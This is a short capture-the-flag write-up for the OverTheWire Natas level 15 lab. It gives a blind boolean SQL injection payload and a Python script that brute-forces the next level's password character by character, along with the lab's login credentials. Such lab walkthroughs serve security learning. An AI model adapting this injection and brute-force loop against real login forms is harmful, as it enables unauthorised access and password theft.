![image](https://github.com/user-attachments/assets/890b2e18-4423-4558-8858-ad85d5c2d272)
![image](https://github.com/user-attachments/assets/5429ddc6-16c4-4d44-92f0-cf92369eb04f)
This also could be a simple sqli. Now all we have to do is find the right sqli payload.

if we enter natas16 as username, it will return "This user exists".
![image](https://github.com/user-attachments/assets/8463cd3a-cfca-48a0-a68c-1edba663b2cd)

so we have to think about a way to find the password for next level.

natas16" AND BINARY password LIKE "a" #

with this payload, if it returns "This user exists", the first character of the password is 'a' or else, we can try every other alphabets.

we can use burp repeater to brutforce or we can write a python script that does the job.

import requests
import string

url = "http://natas15.natas.labs.overthewire.org"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

chars = string.ascii_letters + string.digits
found = ""

while len(found) < 32:
    for c in chars:
        payload = f'natas16" AND BINARY password LIKE "{found + c}%" #'
        r = requests.post(url, data={"username": payload}, auth=auth)
        if "This user exists" in r.text:
            found += c
            print(f"[+] Found so far: {found}")
            break

![Uploading image.png…]()
